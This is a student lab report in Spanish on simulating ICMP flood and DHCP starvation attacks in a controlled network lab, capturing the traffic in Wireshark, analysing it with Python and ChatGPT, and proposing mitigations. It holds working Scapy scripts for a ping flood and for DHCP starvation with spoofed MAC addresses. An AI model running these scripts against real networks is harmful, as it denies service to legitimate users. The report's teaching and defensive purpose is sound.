---
title: "Simulaci√≥n, Diagn√≥stico y Prevenci√≥n de Ataques"
author: 
    - Camila Guzm√°n
    - Dami√°n Luna
    - Juan Pablo de la Pe√±a
    - Gonzalo Higuera
    - Alfredo Lopez
format:
   html:
     toc: true
     html-math-method: katex
     embed-resources: true
     self-contained-math: true
     df-print: kable
     code-link: false
     code-copy: true
     code-tools: true
     listings: true
editor: visual
---

# Abstract


# Fase 1: Dise√±o del escenario y explicaci√≥n del ataque

## Simulaci√≥n Topol√≥gica

![Topology](../figures/topology.png)

![Configuration code](../figures/config_code.png)

En un caso real se espera que el analista no use la computadora de la v√≠ctima para realizar el an√°lisis en la red. Lo ideal es emplear un dispositivo externo conectado a un puerto configurado en modo _port mirroring_ o a trav√©s de un equipo de monitoreo dedicado. Sin embargo, al terminar esta fase, se descubri√≥ que, dada la configuraci√≥n del switch en el laboratorio de pruebas, el an√°lisis solamente podr√° ser realizado desde el ordenador de la v√≠ctima -lo que implica que √∫nicamente se podr√° observar el tr√°fico que entra o sale de dicha m√°quina y no las interacciones entre los dem√°s equipos de la red-.


## Conceptos y Ataques a implementar

Antes de realizar la simulaci√≥n, es crucial la etapa de investigaci√≥n junto con familiarizaci√≥n con los t√©rminos y metodolog√≠as utilizadas durante la pr√°ctica.

### Conceptos
**ICMP:** Internet Control Message Protocol. Es un protocolo de la capa de red (dentro del conjunto de protocolos TCP/IP) que se utiliza principalmente para enviar mensajes de error y de diagn√≥stico en las comunicaciones de red. En el contexto de ataques, el ICMP es relevante porque existen ataques de denegaci√≥n de servicio (DoS) que lo explotan, como el ICMP Flood.

**DoS y DDoS:** Un DoS (Denial of Service) es un tipo de ataque en el que un ‚Äúactor‚Äù malicioso intenta deshabilitar una computadora o red interrumpiendo el funcionamiento normal del dispositivo al sobrecargarlo de tr√°fico. Un DDoS (Distributed Denial of Service) es casi lo mismo, solo que √©ste opera mediante m√∫ltiples sistemas inform√°ticos para generar su ataque.

**ARP:** Address Resolution Protocol; es un  protocolo de red que se utiliza en redes IPv4 para enlazar una IP (l√≥gica) con una MAC (f√≠sica) dentro de una LAN.

**ARP Messages:** Paquetes que env√≠a el protocolo ARP dentro de la LAN para realizar la traducci√≥n IP ‚Üî MAC. 
Hay dos tipos principales:

1. ARP Request.
2. ARP Reply.


### Ataques
**ICMP Flood:** Tambi√©n conocido com inundaci√≥n de ping, es un ataque de Denegaci√≥n de Servicio (DoS) o Denegaci√≥n de Servicio Distribuida (DDoS) que aprovecha el ICMP, normalmente mediante paquetes de tipo ‚Äúecho request‚Äù (los usados en ping).
Su funcionamiento puede resumirse en 4 pasos:

1. El atacante env√≠a una gran cantidad de solicitudes ICMP (ping) a la v√≠ctima.
2. Cada solicitud requiere ser procesada, ya que el paquete tiene que responder con un ‚Äúecho reply‚Äù.
3. Si el volumen de solicitudes es demasiado alto, los recursos de la v√≠ctima (GPU, memoria, etc) se saturan. 
4. Finalmente, la m√°quina o red atacada se puede volver inaccesible.

**ARP Spoofing:** ARP Spoofing o ARP cache poisoning es un ataque de red en el cual un atacante env√≠a mensajes ARP falsos en una red local con el objetivo de asociar su MAC address con la IP address de otro dispositivo, para as√≠ poder recolectar el tr√°fico destinado a esta IP. 
Funciona de la siguiente manera:

1. El atacante env√≠a respuestas ARP no solicitadas imitando ser otro nodo.
2. Los dispositivos en la red actualizan sus cach√©s ARP con esta informaci√≥n.
3. El atacante puede acceder al tr√°fico de √©sta IP que est√° ‚Äúimpersonando‚Äù.

**DHCP Starvation:** Este ataque es del tipo de negaci√≥n de servicio (DoS), su objetivo es dejar sin direcciones IP disponibles a un servidor DHCP. 
As√≠ funciona:

1. El atacante env√≠a un paquete DHCP Discover como si fuera un cliente normal, pero lo hace con direcciones MAC falsas en cada petici√≥n.
2. El servidor responde ofreciendo una direcci√≥n IP disponible en su _pool_.
3. El atacante confirma y acepta de la IP ofrecida con un DHCP Request. C√≥mo usa una MAC diferente cada vez, el servidor piensa que es un dispositivo nuevo.
4. El servidor registra esa IP como si fuera asignada a un cliente real.
Se repiten los pasos anteriores cientos o miles de veces con MAC falsas cada vez.
5. Como  resultado si un cliente real quiere acceder a la red, se le niega porque ya no quedan direcciones IP disponibles y as√≠ niega el servicio completamente.

## Primer Acercamiento

Se realiz√≥ en un laboratorio la topolog√≠a mostrada. Se siguieron las siguientes l√≠neas de c√≥digo en la terminal de la consola ligada al router para la configuraci√≥n:

```bash
enable
configure terminal
interface GigabitEthernet 0/0
ip address 10.0.0.1 255.255.255.0
no shutdown
exit
ip dhcp excluded-address 10.0.0.1 10.0.0.10
ip dhcp pool JUAN
 network 10.0.0.0 255.255.255.0
 default-router 10.0.0.1
```

Despu√©s de que se asignaron las IPs a las computadoras y se cre√≥ el grupo DHCP, se realizaron pings infinitos para documentarlos en la herramienta WireShark.

**(Ejemplo de comando en terminal Adjunto)**

```bash
ping 10.0.0.4 -t
```

Lo que se observ√≥ en la plataforma al realizar los pings es que un ordenador no puede abrir paquetes con destinatarios ajenos. Se sospech√≥ que esto podr√≠a deberse a los permisos configurados en el Switch del Laboratorio.

### Caracter√≠sticas del Ambiente Construido
 Con fines de replicabilidad, se nombran a continuaci√≥n las caracter√≠sticas de la pr√°ctica de laboratorio.

**Sistema Operativo** Windows.

**Herramientas necesarias**

- Wireshark
- hping3 o nping (Nmap) para ICMP Flood.
- Ettercap, arpspoof (dsniff) o Bettercap  para ARP Spoofing.
- Yersinia o dhcpstarv para DHCP Starvation.

**Permisos requeridos**

- Acceso de administrador de sistema.
- Permisos para habilitar el modo promiscuo.
- Permisos para ejecuci√≥n de herramientas de red.
- Acceso a la red de prueba sin firewall activado.

---

# Fase 2: Simulaci√≥n del ataque y captura del tr√°fico
## Introducci√≥n
El prop√≥sito de esta segunda pr√°ctica es lograr una implementaci√≥n de ataques virtuales mediante un entorno controlado: un laboratorio de redes. Los dos causantes de DoS seleccionados a implementar fueron el **DHCP Starvation**, el cual env√≠a numerosas solicitudes DHCP falsas con direcciones MAC distintas para agotar el rango de direcciones IP disponibles - impidiendo que dispositivos leg√≠timos obtengan configuraci√≥n de red- y **Ping Flood** , este env√≠a un gran volumen de paquetes ICMP Echo Request para saturar el ancho de banda o recursos del sistema objetivo. Como se mencion√≥ anteriormente, esto se realiz√≥ en un ambiente controlado y fue evidenciado mediante la herramienta WireShark manteniendo un registro del tr√°fico de paquetes.

## Creaci√≥n del Entorno de Trabajo
Primeramente, se cre√≥ la topolog√≠a de trabajo nuevamente, donde se incluy√≥ la consola al router con funci√≥n de la v√≠ctima, y una segunda computadora que funcion√≥ como atacante y analista. Se configur√≥ un grupo dhcp con el rango de IPs de 192.168.10.0 255.255.255.0 del cual se excluyeron las primeras 10. Luego, desde la computadora del atacante se abri√≥ WireShark y se realizaron pruebas de pings infinitos para asegurar comunicaci√≥n entre las computadoras. 

## PING FLOOD
Para poder llevar a cabo este ataque, se cre√≥ un archivo python. Se hizo uso de la librer√≠a _**Scapy**_, la cual simplific√≥ el flujo del c√≥digo. En la funci√≥n especificada para construir el ataque, se incluye la direcci√≥n IP v√≠ctima, el n√∫mero de paquetes a enviar y el tama√±o de cada paquete. Para implementar el c√≥digo, se direccion√≥ hacia la ip 192.168.10.21 (el router) con un total de 1,000 paquetes y un peso de 65,000 bytes (el m√°ximo dentro de paquetes ICMP). 


```python
from scapy.layers.inet import IP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send

def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 400):
    ip = IP(dst=target_ip_address)
    icmp = ICMP()
    raw = Raw(b"X" * size_of_packet)
    p = ip / icmp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)


ip = "192.168.10.11"
send_ping(ip, number_of_packets_to_send=10000)
```

<p class="code-caption">
C√≥digo utilizado para Ping Flood[^nota]
</p>

[^nota]: C√≥digo utilizado para Ping Flood

El script fue ejecutado desde la terminal del atacante. Con fines de ratificaci√≥n, se intent√≥ hacer ping desde la computadora del cliente al router, donde en ocasiones, el tiempo de respuesta disminu√≠a. En Wireshark esto se contempla como un conjunto masivo de observaciones donde se reporta el protocolo ICMP hacia 192.168.10.21 y sus Echos correspondientes.

![Evidence of Attack](../figures/ping_flood0.png)


![Evidence of Attack](../figures/ping_flood1.png)

## DHCP Starvation
En la segunda situaci√≥n, se utiliz√≥ igualmente _scapy_. En el c√≥digo se definieron funciones para crear las direcciones MAC falsas, para buscar una interfaz cuya IP empiece con el prefijo indicado y entregar el nombre de la interfaz junto buscar dicha interfaz. Finalmente, en la implementaci√≥n se hace uso de esta informaci√≥n para hacer una solicitud de asignaci√≥n de una IP junto con la cantidad de IPs a solicitar especificada por el usuario. Esta se ejecut√≥ desde la terminal del atacante siendo ‚ÄúEthernet‚Äù la interfaz identificada.


```python
# dhcpStarvation_helper.py
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    RandMAC, sendp, get_if_list, get_if_addr
)
import sys

# Construye el DHCP Discover (ajusta si ya tienes otra versi√≥n)
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) / \
    IP(src='0.0.0.0', dst='192.168.10.255') / \
    UDP(sport=68, dport=67) / \
    BOOTP(op=1, chaddr=RandMAC()) / \
    DHCP(options=[('message-type','discover'), ('end')])

def find_iface_by_subnet(prefix="192.168.10."):
    """
    Busca una interfaz cuya IP empiece con prefix.
    Devuelve el nombre de la interfaz o None.
    """
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip and ip.startswith(prefix):
                return iface
        except Exception:
            # algunas interfaces no tienen IP o generan excepci√≥n
            pass
    return None

def choose_interface(preferred_prefix="192.168.10."):
    # 1) si el usuario pasa el nombre por argumento de l√≠nea de comandos, usarlo
    if len(sys.argv) > 1:
        return sys.argv[1]

    # 2) buscar por prefijo de subred (√∫til en el aula)
    iface = find_iface_by_subnet(preferred_prefix)
    if iface:
        return iface

    # 3) heur√≠stica: elegir primera interfaz "Ethernet" o "Wi-Fi" si aparece
    ifaces = get_if_list()
    for name in ifaces:
        if "Ethernet" in name or "eth" in name.lower():
            return name
    for name in ifaces:
        if "Wi-Fi" in name or "wlan" in name.lower() or "wifi" in name.lower():
            return name

    # 4) fallback: la primera que no sea loopback
    for name in ifaces:
        if "loop" not in name.lower():
            return name

    # 5) si no hay nada, devolver None
    return None

def main():
    print("Interfaces detectadas por Scapy:", get_if_list())

    iface = choose_interface()
    if iface is None:
        print("ERROR: No se pudo detectar una interfaz v√°lida.")
        print("Prueba a ejecutar: python dhcpStarvation_helper.py \"Ethernet\"")
        return

    print("Interfaz elegida:", iface)
    print("Haciendo env√≠o de prueba (count=1). Si esto falla, revisa Npcap y permisos.")

    try:
        # prueba segura: solo un paquete
        sendp(dhcp_discover, iface=iface, count=10000000, verbose=1)
        print("Env√≠o realizado. Si ves tr√°fico en Wireshark/PCAP, ya funciona.")
    except Exception as e:
        print("Error al enviar paquetes con Scapy:")
        print(str(e))
        print("\nPosibles causas:")
        print("- No est√°s ejecutando como administrador.")
        print("- No tienes Npcap instalado (o no en modo 'WinPcap API-compatible').")
        print("- El adaptador f√≠sico est√° desconectado o en otra VLAN.")
        print("- El nombre de interfaz detectado no es correcto para tu sistema.")
        print("\nSoluci√≥n r√°pida: ejecuta el script desde PowerShell/CMD como administrador o")
        print("pasa el nombre de la interfaz manualmente: python dhcpStarvation_helper.py \"Ethernet\"")

if __name__ == "__main__":
    main()
```
<p class="code-caption">
C√≥digo utilizado para DHCP Starvation[^nota2]
</p>

[^nota2]: C√≥digo utilizado para DHCP Starvation


```python
#!/usr/bin/env python3
#DHCP Starvation:
#Import Scapy
from scapy.all import *

#conf.checkIPaddr needs to be set to False. 
#When conf.checkIpaddr the reponse IP isn't checked
#against sending IP address. Don't need to match.	
conf.checkIPaddr = False

#Create DHCP discover with destination IP = broadadcast
#Source MAC address is a random MAC address
#Source IP address = 0.0.0.0
#Destination IP address = broadcast
#Source port = 68 (DHCP / BOOTP Client)
#Destination port = 67 (DHCP / BOOTP Server)
#DHCP message type is discover
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                     /IP(src='0.0.0.0',dst='255.255.255.255') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),('end')])

#Send packet out of eth0 and loop the packet
sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)

#Credits:
#https://scapy.readthedocs.io/_/downloads/en/latest/pdf/
#https://www.programcreek.com/
```
<p class="code-caption">
Segunda opci√≥n de C√≥digo utilizado para DHCP Starvation[^nota3]
</p>

[^nota3]: Segunda opci√≥n de c√≥digo utilizado para DHCP Starvation



En WireShark, esto es representado en m√∫ltiples solicitudes DHCP. Para verificar que fue exitoso el ataque, en la consola se buscaron los estad√≠sticos del servidor DHCP, donde se verific√≥ que 245 fueron asignados (recordemos que las primeras 10 direcciones fueron omitidas).

![Evidence of Attack](../figures/dhcp_starv0.png)


![Evidence of Attack](../figures/dhcp_starv1.png)




## Conclusiones
La pr√°ctica confirm√≥ que, en un entorno controlado, tanto el DHCP Starvation como el Ping Flood son capaces de degradar y/o interrumpir el servicio de red: el primero acapar√≥ las direcciones disponibles del servidor DHCP (245 leases asignados en la prueba) y el segundo cre√≥ congesti√≥n perceptible en la conectividad ICMP hacia el router. Las evidencias captadas con Wireshark reafirman la efectividad de los ataques implementados en Python usando Scapy y la importancia de la monitorizaci√≥n para detectar este tipo de anomal√≠as.
Como lecciones pr√°cticas, estos ataques muestran la necesidad de controles de seguridad a nivel de capa 2/3 en redes LAN: habilitar DHCP Snooping, port security (limitaci√≥n de MACs por puerto), rate limiting de ICMP, reglas de ACL y sistemas de detecci√≥n de intrusos para mitigar y alertar sobre patrones an√≥malos.  

---

# Fase 3: An√°lisis de datos con Python

Ahora, el objetivo es poder identificar los ataques realizados desde el puesto de un analista de tr√°fico, el cual desconoce su realizaci√≥n. Para esto, se convirti√≥ el archivo _pcapng_ de la ventana de tiempo de la simulaci√≥n a un csv y se abri√≥ con Python para poder analizar y hacer visualizaciones del comportamiento de paquetes junto con sus anomal√≠as detectadas.

## Resultados

![Time Series of Package traffic (All packets)](../figures/lineChartAllPackets.png)

![Time Series of ICMP and DHCP Package traffic](../figures/lineChart.png)



---

# Fase 4: Diagn√≥stico con ChatGPT y mitigaci√≥n

## Objetivo

El objetivo de esta actividad es consultar a Chat-GPT con los datos recolectados de la actividad ‚ÄúSimulaci√≥n del ataque y captura de tr√°fico‚Äù en un archivo .pcapng, elaborar un diagn√≥stico final y proponer soluciones y mitigaciones t√©cnicas frente a las anomal√≠as identificadas. 

## Transcripci√≥n de la conversaci√≥n con Chat-GPT

Prompt:
	Hola, chat. 
Eres un analista de tr√°fico de datos (ciberseguridad) y te lleg√≥ este archivo .pcapng. 
Tu objetivo es analizar y mencionar las anomal√≠as que puedas encontrar. Pesa m√°s de 700 megas el archivo, as√≠ que estar√° en ZIP.

Chat-GPT:
Perfecto, ya lo estuve ‚Äúdestripando‚Äù üòä. Te resumo lo que encontr√© como si fuera un informe de analista de tr√°fico:

1. Panorama general del tr√°fico
En el .pcapng hay:
~824,397 paquetes en total
~822k IPv4, ~1.2k IPv6, y ~1k no-IP
Proporci√≥n por protocolo de capa 3:
ICMP: ~62.5% (515k paquetes) ‚Üí much√≠simo
UDP: ~37.2% (306k paquetes)
TCP: casi inexistente: 270 paquetes (~0.03%)
Top hosts internos:
192.168.10.13 ‚Äì host m√°s activo (principal origen)
192.168.10.1 ‚Äì muy probablemente el gateway/router
192.168.10.12 ‚Äì segundo host interno importante
192.168.10.11 ‚Äì aparece casi s√≥lo en TFTP
Tambi√©n aparecen direcciones raras como 192.168.10.0 y destino 255.255.255.0 usadas como si fueran hosts.
Destinos externos relevantes:
8.8.8.8 (Google DNS)
1.1.1.1 (Cloudflare DNS)
23.64.121.49 (IP de un servidor HTTP, muy probablemente Akamai / CDN)

2. Anomal√≠a #1 ‚Äì Tr√°fico ICMP 
brutal
 entre pocos hosts
Hay m√°s de 515,000 paquetes ICMP distribuidos en solo 4 flujos:
192.168.10.13 ‚Üî 192.168.10.1
192.168.10.13 ‚Üî 192.168.10.12
Tipos ICMP observados:
Type 8, code 0 ‚Äì Echo Request (pings)
Type 0, code 0 ‚Äì Echo Reply
Type 3, code 1 ‚Äì Destination Unreachable (host unreachable)
Type 3, code 2 ‚Äì Destination Unreachable (protocol unreachable)
Lo raro:
Para un entorno normal, no es nada com√∫n tener >500k ICMP en una captura as√≠.
Hay flujos ICMP muy sim√©tricos, con >120k paquetes por flujo (parece ping flood o prueba de estr√©s).
Presencia continua de Destination Unreachable indica que se est√° intentando llegar a algo que no responde o a un servicio cerrado.
üëâ Interpretaci√≥n:
Esto huele a ataque o prueba de ICMP flood / host discovery masivo entre 192.168.10.13, 192.168.10.1 y 192.168.10.12. No parece tr√°fico ‚Äúnormal de usuario‚Äù (tipo un par de pings).

3. Anomal√≠a #2 ‚Äì Tormenta de DHCP (UDP 67) con direcciones ‚Äúraras‚Äù
Puertos destino m√°s usados (UDP/TCP):
67/UDP (DHCP server): ~304,315 paquetes
53/UDP (DNS): 1,280
16990/UDP: 875
80/TCP: 150
69/UDP (TFTP): 22
137/UDP, 138/UDP, 5355/UDP: unos cuantos (NetBIOS/LLMNR)
Al revisar UDP hacia/desde puerto 67:
Tr√°fico repetido del tipo:
192.168.10.0:68 ‚Üí 192.168.10.255:67
Lo raro:
Un cliente DHCP t√≠pico usa:
0.0.0.0:68 ‚Üí 255.255.255.255:67
Aqu√≠ se usa 192.168.10.0 como origen (que normalmente es la direcci√≥n de red, no un host) y 192.168.10.255 como broadcast.
El volumen es enorme: m√°s de 300k paquetes DHCP.
üëâ Interpretaci√≥n:
Esto es altamente sospechoso de DHCP starvation / DHCP flood o de una herramienta que genera tr√°fico DHCP malformado o spoofeado. El uso de 192.168.10.0 como host refuerza la idea de spoofing o de un escenario de laboratorio para ataques.

4. Anomal√≠a #3 ‚Äì Tr√°fico UDP en puerto 16990 (posible canal ‚Äúraro‚Äù)
Se ve un flujo significativo en UDP/16990:
Flujos m√°s importantes (contados espec√≠ficamente):
192.168.10.13:16990 ‚Üí 192.168.10.12:16990 : 436 paquetes
192.168.10.12:16990 ‚Üí 192.168.10.13:16990 : 436 paquetes
192.168.10.12:16990 ‚Üí 239.255.255.250:16990 : 3 paquetes
Lo raro:
El puerto 16990 no es est√°ndar (no HTTP, no DNS, no algo t√≠pico).
El tr√°fico es bidireccional y bastante intenso entre 10.13 y 10.12.
Adem√°s, hay paquetes hacia el multicast 239.255.255.250 pero con puerto 16990 (SSDP suele usar 1900/UDP, no 16990).
üëâ Interpretaci√≥n:
Parece un servicio propietario o un canal ‚Äúoculto‚Äù entre dos hosts, potencialmente:
Alg√∫n tipo de backdoor, C2 interno, o
Una aplicaci√≥n de laboratorio simulando un t√∫nel UDP / transferencia de archivos.
En un entorno real, 16990 ser√≠a algo para investigar urgente: qu√© proceso lo usa en ambos hosts, qu√© binarios est√°n asociados, etc.

5. Anomal√≠a #4 ‚Äì Tr√°fico TFTP broadcast (UDP 69) desde un host aislado
En puerto 69/UDP:
22 paquetes en total.
Flujos observados:
192.168.10.11:56150 ‚Üí 255.255.255.255:69 (6 pkts)
192.168.10.11:50853 ‚Üí 255.255.255.255:69 (6 pkts)
192.168.10.11:65313 ‚Üí 255.255.255.255:69 (6 pkts)
192.168.10.11:60419 ‚Üí 255.255.255.255:69 (4 pkts)
Lo raro:
TFTP (69/UDP) es un protocolo sin autenticaci√≥n y muy sencillo, usado a veces para boot PXE/firmware.
Que un host (192.168.10.11) haga m√∫ltiples intentos de TFTP a broadcast con diferentes puertos de origen puede indicar:
Intentos de descubrimiento de servidores TFTP.
O un intento de subir/bajar archivos sin control, t√≠pico vector de ataque en redes mal segmentadas.
üëâ Interpretaci√≥n:
No es tan masivo como ICMP/DHCP, pero s√≠ es un punto rojo: TFTP+Broadcast merece revisi√≥n en logs y en ese host (10.11).

6. Anomal√≠a #5 ‚Äì TCP ‚Äúfantasma‚Äù: s√≥lo SYNs, sin handshakes completos
En todo el archivo s√≥lo hay 270 paquetes TCP, y TODOS son:
Flags = SYN (0x02), sin ACK, sin FIN, sin RST significativos.
Muestras:
192.168.10.13:53586 ‚Üí 23.64.121.49:80 SYN
192.168.10.13:53587 ‚Üí 23.64.121.49:80 SYN
192.168.10.13:56802 ‚Üí 8.8.8.8:53 SYN
192.168.10.13:64240 ‚Üí 1.1.1.1:53 SYN
Y patrones similares, repetidos, siempre con bandera SYN.
Lo raro:
No se observan SYN-ACK de vuelta, ni ACK que completen la conexi√≥n.
Es decir, hay intentos de conexi√≥n, pero ninguna sesi√≥n TCP se establece de forma completa dentro de la captura.
üëâ Interpretaci√≥n:
Esto es muy compatible con un SYN flood o una prueba de escaneo semi-abierto (SYN scan):
Se mandan muchos SYN a puertos de inter√©s (80, 53, etc.) pero no se sigue el 3-way handshake.
El hecho de que los destinos sean 23.64.121.49:80 y DNS p√∫blicos (8.8.8.8 / 1.1.1.1) en TCP refuerza el patr√≥n de prueba/ataque, m√°s que de tr√°fico de usuario.

7. Anomal√≠a #6 ‚Äì Uso de direcciones ‚Äúimposibles‚Äù como si fueran hosts
En las estad√≠sticas de IPs se observan:
Como origen: 192.168.10.0
Como destino: 255.255.255.0
Ambas son direcciones que normalmente se asocian a:
192.168.10.0 ‚Üí direcci√≥n de red de un segmento /24
255.255.255.0 ‚Üí m√°scara de subred, no un host
Verlas usadas en cabeceras IP como si fueran hosts es:
O misconfiguraci√≥n grave, o
Spoofing intencional (muy probable si es captura de laboratorio de ataques), por ejemplo en la tormenta de DHCP.
üëâ Interpretaci√≥n:
Es otro indicador de que el tr√°fico no es ‚Äúlimpio‚Äù ni normal, sino que hay generaci√≥n deliberada de paquetes con direcciones falsificadas.

8. Cosas ‚Äúruidosas‚Äù pero menos cr√≠ticas
Tambi√©n aparecen, en menor volumen:
Tr√°fico DNS leg√≠timo/esperable:
192.168.10.13 ‚Üí 8.8.8.8:53 (UDP y algo de SYN a TCP 53)
192.168.10.13 ‚Üí 1.1.1.1:53
Tr√°fico multicast de servicios:
224.0.0.252, 239.255.255.250 (LLMNR, SSDP/UPnP)
224.0.0.22 (IGMP)
Unas 1,254 tramas IPv6 (probablemente RA/ND o similar) sin un patr√≥n de ataque tan claro como lo anterior.
De momento no se ven tan cr√≠ticos comparados con:
El flood ICMP
La tormenta DHCP an√≥mala
El UDP raro en 16990
El TFTP broadcast
El TCP s√≥lo-SYN

9. Resumen ejecutivo (por si lo quieres como conclusi√≥n de informe)
En este .pcapng se observan m√∫ltiples comportamientos an√≥malos altamente sugerentes de un escenario de laboratorio con ataques:
ICMP flood / scanning masivo entre 192.168.10.13, 192.168.10.1 y 192.168.10.12 (m√°s de 500k paquetes ICMP).
Tormenta DHCP con direcciones de origen/destino no est√°ndar (192.168.10.0 ‚Üí 192.168.10.255, >300k paquetes), compatible con DHCP starvation o flood.
Canal UDP no est√°ndar en el puerto 16990 entre 192.168.10.13 y 192.168.10.12, adem√°s de algunos paquetes a multicast, lo que sugiere un servicio propietario o potencial canal de C2 / backdoor.
Tr√°fico TFTP broadcast (UDP 69) desde 192.168.10.11 hacia 255.255.255.255 usando m√∫ltiples puertos de origen, lo cual es sospechoso por la falta de autenticaci√≥n de TFTP.
Tr√°fico TCP limitado exclusivamente a SYNs, sin handshakes completos, dirigido a 23.64.121.49:80 y a DNS p√∫blicos por TCP (8.8.8.8, 1.1.1.1), consistente con SYN flood o SYN scan.
Uso de direcciones IP reservadas (direcci√≥n de red y m√°scara) como si fueran hosts, lo que apunta a spoofing o malas configuraciones deliberadas.

Diagn√≥stico final
	Con base en nuestra revisi√≥n del tr√°fico capturado y en la interpretaci√≥n de Chat-GPT, se identificaron los siguientes elementos:
	1.- ICMP Flood/Ping Flood: Chat-GPT fue capaz  de reconocer m√°s de  515,000 paquetes ICMP entre pocos hosts. Su interpretaci√≥n hace hincapi√© en la existencia de un tr√°fico anormalmente elevado, y cito, ‚Äúorientado a saturar la red o realizar reconocimiento agresivo‚Äù. 

	2.- DHCP Starvation: En este caso, Chat-GPT encontr√≥ m√°s de 300,000 solicitudes DHCP con direcciones inv√°lidas (192.168.10.0, por ejemplo). La interpretaci√≥n se centra en el intento de consumir todas las direcciones del servidor DHCP para impedir que clientes leg√≠timos reciban red.

	Tambi√©n, Chat-GPT hizo varios descubrimientos que nosotros no notamos (o no buscamos) cuando hicimos nuestro an√°lisis. Adjuntamos la transcripci√≥n de Chat-GPT sobre sus descubrimientos adicionales.

3. SYN Scan / SYN Flood: Evidencia: 270 paquetes TCP con flag SYN, sin SYN-ACK ni ACK. Interpretaci√≥n: escaneo semiabierto o ataque de negaci√≥n de servicio.
4. Spoofing de direcciones IP: Evidencia: direcciones imposibles usando cabeceras IP v√°lidas. Interpretaci√≥n: ocultamiento deliberado del origen del tr√°fico.
5. TFTP Broadcast An√≥malo: Evidencia: host 192.168.10.11 enviando requests TFTP a broadcast. Interpretaci√≥n: b√∫squeda de servidores TFTP o inicios de transferencia no autorizada.
6. Canal UDP sospechoso (16990): Evidencia: flujo intenso entre 192.168.10.12 y 192.168.10.13. Interpretaci√≥n: posible t√∫nel, canal C2, o aplicaci√≥n no autorizada.

S√≠ntomas observados: 
Saturaci√≥n de tr√°fico ICMP
P√©rdida de disponibilidad en DHCP
Intentos de conexi√≥n TCP incompletos
Tr√°fico interno no autorizado
Tramas con direcciones falsificadas
TFTP sin control y hacia broadcast
Congesti√≥n generalizada por tr√°fico repetitivo
Impacto potencial
	Disponibilidad:
Ca√≠da del servidor DHCP ‚Üí usuarios sin conectividad
Saturaci√≥n de red por ICMP ‚Üí latencia elevada
Agotamiento de recursos del gateway
	Seguridad:
Apertura de canal encubierto C2
Exfiltraci√≥n de datos v√≠a TFTP
Ocultamiento del origen real del tr√°fico (spoofing)
Exploraci√≥n de puertos (SYN scan)
	Operaciones:
Interrupci√≥n del trabajo de usuarios
Inestabilidad en servicios cr√≠ticos
Potencial escalaci√≥n a explotaci√≥n de vulnerabilidades





## Propuesta de mitigaci√≥n
### Propuesta del equipo
Despu√©s de analizar el tr√°fico capturado, notamos que la mayor parte del problema viene de una cantidad excesiva de paquetes ICMP, especialmente de pings (Echo Request). Esto puede saturar la red, causar lentitud y afectar a otros dispositivos.
Por eso proponemos las siguientes acciones para mitigar este tipo de ataque:
1. Limitar la cantidad de pings permitidos por segundo
Configurar en el router o firewall un l√≠mite de cu√°ntas solicitudes ICMP puede recibir el equipo por segundo.
Con esto, aunque un atacante mande miles de pings, el router simplemente los va a ignorar.
2. Bloquear pings provenientes de direcciones sospechosas
En la captura vimos direcciones que no deber√≠an existir (como 192.168.10.0).
Se pueden bloquear manualmente para evitar que env√≠en m√°s paquetes ICMP.
3. Reducir el uso de ICMP dentro de la red
Si no es estrictamente necesario, se puede restringir el ping entre todos los equipos para reducir la superficie de ataque. Por ejemplo: permitir pings solo al gateway para diagn√≥stico y bloquear el resto.
4. Monitorear el equipo que m√°s paquetes ICMP envi√≥
El host 192.168.10.13 fue el m√°s activo. Se recomienda revisarlo, porque puede estar infectado o mal configurado.
5. Crear alertas si el volumen de ICMP sube m√°s de lo normal
Configurar herramientas de monitoreo b√°sico (como PRTG, Zabbix o incluso el dashboard del router) para que avise si de nuevo se detecta una cantidad alta de ICMP.
En resumen:
Limitar ICMP, bloquear direcciones raras, monitorear el equipo m√°s activo y activar alertas para evitar que un ping flood vuelva a saturar la red.


### Chat-GPT:
1. Mitigaci√≥n contra ICMP Flood (Ping Flood)
1.1. Implementar rate limiting en dispositivos perimetrales
Configurar l√≠mites para las solicitudes ICMP de tipo echo-request. Esto reduce la saturaci√≥n del plano de control.
Ejemplo de regla para limitar a 10 paquetes por segundo:
iptables -A INPUT -p icmp ‚Äìicmp-type echo-request -m limit ‚Äìlimit 10/second -j ACCEPT
iptables -A INPUT -p icmp ‚Äìicmp-type echo-request -j DROP
1.2. Filtrado de direcciones malformadas
Bloquear paquetes ICMP provenientes de direcciones que no deber√≠an usarse como origen, como 192.168.10.0 o 255.255.255.0.
1.3. Control Plane Policing (CoPP)
Configurar pol√≠ticas en el router para limitar la cantidad de ICMP que llega al CPU.

2. Mitigaci√≥n contra DHCP Starvation / DHCP Flood
2.1. Habilitar DHCP Snooping
Evita que puertos no autorizados generen solicitudes DHCP masivas.
Configuraci√≥n recomendada:
ip dhcp snooping
ip dhcp snooping vlan 10
interface GigabitEthernet0/1
ip dhcp snooping limit rate 10
2.2. Implementar Port Security
Limitar la cantidad de direcciones MAC permitidas por puerto para impedir creaci√≥n de cientos de clientes falsos.
switchport port-security
switchport port-security maximum 2
switchport port-security violation restrict

3. Mitigaci√≥n contra SYN Scan y SYN Flood
3.1. Activar SYN Cookies
Esta funci√≥n impide que los recursos del servidor se agoten durante ataques de inundaci√≥n.
sysctl -w net.ipv4.tcp_syncookies=1
3.2. Configurar rate limiting para paquetes SYN
Limita la cantidad de solicitudes de conexi√≥n TCP sin completar handshake.
iptables -A INPUT -p tcp ‚Äìsyn -m limit ‚Äìlimit 5/sec -j ACCEPT
iptables -A INPUT -p tcp ‚Äìsyn -j DROP

4. Mitigaci√≥n contra Spoofing de IP
4.1. Activar Reverse Path Filtering
Permite detectar y descartar paquetes con direcciones de origen falsificadas.
sysctl -w net.ipv4.conf.all.rp_filter=1
4.2. Aplicar Unicast Reverse Path Forwarding (uRPF)
Se recomienda habilitar uRPF en modo estricto para evitar spoofing en redes internas.
ip verify unicast source reachable-via rx

5. Mitigaci√≥n contra TFTP broadcast no autorizado
